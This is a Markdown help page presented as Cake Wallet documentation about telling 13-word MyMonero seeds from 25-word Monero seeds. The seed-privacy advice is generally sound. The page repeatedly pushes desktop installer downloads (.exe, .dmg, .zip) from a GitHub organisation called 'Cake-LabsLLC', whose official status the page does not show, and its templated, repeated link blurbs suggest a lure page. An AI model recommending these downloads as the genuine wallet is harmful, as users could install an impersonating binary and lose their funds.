<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-article.png" alt="Cake Wallet article banner" width="100%"></p>

<h1 align="center">Understand newer and legacy seed formats in Cake Wallet | Cake Wallet</h1>
<p align="center">Practical, private steps for resolving this Cake Wallet question.</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## Short answer

Do not judge a seed by its name alone. Check the word count shown by your backup and use the appropriate restore option without sharing the words.

## You'll see this if

- You have a backup with a word count that differs from an instruction you found, or you are unsure whether an older MyMonero seed is compatible with a newer wallet.
- You are unsure which safe troubleshooting step to try next.
- You want to protect wallet recovery information while resolving the issue.

## Why it happens

Seed formats can differ. MyMonero seeds include a 13-word MyMonero-specific legacy format and a 25-word standard Monero format. Newer wallets may use a different seed format; check the word count your backup shows. The format and exact words matter, so adding, removing, or reordering words is not a safe conversion method.

## Fix

1. Count the words in your original backup privately. Do not paste the seed into a search box, online checker, or message.
2. Identify what the backup record says about its origin and format. If it came from MyMonero, note that the 13-word format is MyMonero-specific legacy; a 25-word backup is standard Monero.
3. Open the genuine Cake Wallet restore option and follow its prompts for the backup you have. Do not force a different word count or guess at a format.
4. Check spelling and order against the original record. Keep the words offline and out of screenshots or screen-sharing sessions.
5. After a successful restore, allow scanning to complete. If the wallet appears empty, review restore height before assuming the backup failed.
6. For desktop release details, use the [Cake Wallet GitHub project](https://github.com/Cake-LabsLLC/cake-wallet-desktop).

> [!TIP]
> Keep a written record of non-secret troubleshooting details. Never include seed words, keys, PINs, or recovery screenshots in that record.

Compare [Cake Wallet’s 13-word restore guide](./cake-wallet-restore-13-word-seed.md) with the [25-word guide](./cake-wallet-restore-25-word-seed.md).

For another perspective, read the [Cake Wallet related guide](./cake-wallet-polyseed-vs-legacy-seed.md).

---

## If that did not work

If a seed is rejected, stop and verify the record’s word count and origin instead of trying random variations. A 13-word MyMonero-specific seed is not the same as a 25-word standard Monero seed. If the backup is newer or uses another format, follow the app’s available guidance. You can read [Cake Wallet’s MyMonero restoration context](./cake-wallet-restore-13-word-seed.md) and the [25-word seed article](./cake-wallet-restore-25-word-seed.md). Keep your actual words private while using these explanations.

A few careful checks can make this process less confusing. First separate wallet access from recovery: a PIN or a desktop launch issue is not the same thing as seed validity, and node connectivity is not a substitute for recovery details. Write down the non-secret symptoms you observe, such as the wording of an error, whether the app opens, or whether scanning advances. This helps you compare behavior without exposing private information.

Avoid making several changes at once. If you change a restore option, node setting, or installation state, you may not know which change affected the result. Where practical, note the original non-secret setting before changing it. Give scans time to complete, particularly after a restore that starts earlier in the blockchain. A longer scan is not necessarily evidence that the wallet or backup is broken.

Protect yourself from recovery scams throughout troubleshooting. A person who asks you to reveal a seed, private key, PIN, or recovery screenshot is asking for information that should remain yours. Do not use a site or chat as a seed checker. Official-looking language does not make an unsolicited request safe. Keep the words out of email, shared documents, and screen recordings.

If you need to change devices or installations, plan the recovery first. Keep the existing app and its data intact until you have confirmed that you can restore from your own backup. Cake Wallet can restore a MyMonero seed, including the 13-word MyMonero-specific legacy format or the 25-word standard Monero format. Newer wallets may use a different seed format; check the word count your backup shows. Do not combine formats or guess missing words.

Use the linked guides as background, not as a reason to disclose any secret. They describe adjacent topics such as recovery, synchronization, privacy, and migration. Menu wording can vary, so follow the general options presented in your own app rather than searching for an exact label that may not appear. If a troubleshooting step would require surrendering control of your device or revealing recovery information, stop and choose a safer route.

A successful check should leave you with a clear distinction between what you know and what remains uncertain. For example, you can confirm that a backup has a particular word count without publishing the words, or note that a sync indicator has not moved without sending a screen image containing keys. Keep that distinction in mind when asking for general help.


> [!WARNING]
> A seed or private key can provide control of a wallet. Never send it to support, enter it on a website, or disclose it to someone offering to recover funds.

## Prevention

Record the seed format and wallet identity alongside a backup, but never record seed words in the label. Store the words in exact order in a protected offline location. Check that a copy is complete before relying on it. Ignore anyone offering to convert or validate a seed if they ask you to disclose it; nobody legitimate needs your seed.



---

## FAQ

<details><summary>Should I share my seed with support?</summary>

No. Nobody legitimate asks for your seed, keys, or PIN. Keep recovery information private and enter it only in the genuine app when needed.

</details>

<details><summary>Does a PIN replace my recovery backup?</summary>

No. A PIN protects access on an installation. Keep a separate, complete recovery backup in a private place.

</details>

<details><summary>Can I use a MyMonero seed?</summary>

Cake Wallet can restore a MyMonero seed. MyMonero used a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed.

</details>

<details><summary>What if the wallet looks empty after recovery?</summary>

Allow scanning to finish and check the restore height. An earlier height can find older activity but takes longer to scan.

</details>

---

## Download Cake Wallet Desktop

- Windows: [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe)
- macOS: [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg)
- Linux: [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip)

Check each file against the checksums on the [Cake Wallet v6.5.1 release](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Restore Cake Wallet from keys | Cake Wallet](./cake-wallet-restore-from-keys.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Back up your Cake Wallet seed | Cake Wallet](./cake-wallet-backup-seed.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Troubleshoot a Cake Wallet seed that is not accepted | Cake Wallet](./cake-wallet-seed-not-accepted.md) | Practical, private steps for resolving this Cake Wallet question. |

[Back to all Cake Wallet guides](https://github.com/Cake-LabsLLC/learn)
